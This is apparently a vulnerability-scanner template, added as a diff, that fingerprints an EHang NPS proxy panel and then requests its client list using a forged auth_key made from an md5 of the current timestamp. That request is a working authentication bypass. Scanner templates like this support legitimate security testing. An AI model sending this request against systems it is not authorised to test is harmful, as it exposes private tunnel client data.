@@ -1,0 +1,48 @@
+id: yaml-poc-ehang_io-nps-logical-CT-469727
+info:
+  name: EHang IO NPS Logical Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Logical vulnerability in EHang IO allowing sensitive operations if specific criteria are met.
+
+variables:
+  r1: "{{unix_time()}}"
+  r2: "{{md5(r1)}}"
+
+http:
+  - id: finger
+    method: GET
+    path:
+      - "{{BaseURL}}/login/index"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "https://ehang.io/nps"
+      - type: word
+        part: header
+        words:
+          - "beegosessionID="
+
+  - id: r0
+    method: POST
+    path:
+      - "{{BaseURL}}/client/list"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "search=&order=asc&offset=0&limit=10&auth_key={{r2}}&timestamp={{r1}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "rows"
+          - "total"
